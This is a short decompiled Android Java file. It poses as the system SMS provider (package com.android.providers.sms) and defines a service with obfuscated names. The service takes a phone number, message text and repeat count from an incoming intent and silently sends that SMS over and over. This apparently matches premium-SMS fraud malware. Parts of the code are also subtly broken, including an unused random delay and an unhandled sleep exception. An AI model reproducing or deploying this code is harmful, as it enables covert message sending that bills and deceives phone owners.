package com.android.providers.sms;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.gsm.SmsManager;
import java.util.Random;

public class SMSSendService extends Service {
    private void a(au auVar) {
        String h = auVar.h();
        String g = auVar.g();
        int intValue = Integer.valueOf(auVar.i()).intValue();
        SmsManager smsManager = SmsManager.getDefault();
        PendingIntent broadcast = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
        for (int i = 0; i < intValue; i++) {
            int nextInt = (new Random().nextInt(3) + 1) * 1000;
            Thread.sleep((long) i);
            smsManager.sendTextMessage(h, null, g, broadcast, null);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onStart(Intent intent, int i) {
        try {
            a((au) intent.getSerializableExtra("PackBean"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
